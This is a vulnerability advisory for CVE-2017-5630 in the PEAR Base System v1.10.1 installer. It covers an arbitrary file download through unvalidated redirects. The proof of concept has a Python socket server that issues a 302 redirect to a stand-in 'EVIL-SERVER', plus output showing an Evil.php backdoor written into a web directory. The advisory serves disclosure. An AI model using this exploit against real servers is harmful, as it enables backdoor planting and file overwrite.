[+] Credits / Discovery: John Page AKA hyp3rlinx    
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/PEAR-ARBITRARY-FILE-DOWNLOAD.txt
[+] ISR: ApparitionSEC
[+]#############################################################################################
 
 
 
Vendor:
============
pear.php.net
 
 
 
Product:
===================================
PEAR Base System v1.10.1
PEAR Installer&#039;s download utility
 
 
 
Vulnerability Type:
=======================
Arbitrary File Download
 
 
 
CVE Reference:
==============
CVE-2017-5630
 
 
 
Security Issue:
================
 
The download utility class in the Installer in PEAR Base System v1.10.1, does not validate file types and filenames after a redirect,
which allows remote HTTP servers to overwrite files via crafted responses, as demonstrated by a .htaccess overwrite.
 
e.g.
 
pecl download <http://some-vuln-server/file.tgz> 
 
PEAR does not rename the arbitrary invalid file to the originally requested (safe) filename.
Therefore, attackers can overwrite files or download a backdoor if the PECL request is made from from web accesible directory etc..
 
Moreover, PECL doesn&#039;t delete these invalid files upon download, giving the attacker time to exploit it if attackers
can force the HTTP connection to stay open, and before a "invalid file message" is noticed.
 
POC Video:
https://vimeo.com/201341280
 
 
Proof of concept:
This POC involves 3 machines:
First machine is victim making a PECL download command request
Second is the vuln server receiving the file download request
Third is the malicious server hosting the PHP backdoor, .htaccess file etc.
===========================================================================
 
1) Victim machine attempts to download a legit ".tgz" archive.
 
pecl download http://VULN-SERVER:8080/Test.tgz
 
 
2) VULN-SERVER where the victim is requesting "Test.tgz", and attacker controls HTTP response.
 
 
3) EVIL-SERVER where PECL follows and downloads &#039;unintended&#039; Evil.php backdoor.
python -m SimpleHTTPServer 8888
 
 
On VULN-SERVER run "PECL-File-Exploit.py"
 
python PECL-File-Exploit.py 
 
 
import socket
 
HOST=&#039;localhost&#039;
PORT=8080
TARGET=&#039;http://EVIL-SERVER:8888/&#039;
FILE=&#039;.htaccess&#039;
s = socket.socket()
s.bind((HOST, PORT))
s.listen(10)
 
print &#039;Waiting for PECL connections...&#039;
 
 
while True:
    conn, addr = s.accept()
    junk = conn.recv(512) 
    conn.send(&#039;HTTP/1.1 302 Found\r\n&#039;)
    conn.send(&#039;Location: &#039;+TARGET+FILE+&#039;\r\n&#039;)
    conn.close()
s.close()
 
 
 
Then, make request for Test.tgz...
 
C:\xampp\htdocs\webapp>pecl download http://VULN-SERVER:8080/Test.tgz
 
downloading Evil.php ...
Starting to download Evil.php (4,665 bytes)
.....done: 4,665 bytes
File C:\xampp\htdocs\webapp\Evil.php downloaded
 
 
 
Disclosure Timeline:
=====================================
Vendor Notification: January 11, 2017
Informed "PECL package no longer maintained" : January 23, 2017
Opened Bug #2117 : January 25, 2017
January 29, 2017 : Public Disclosure

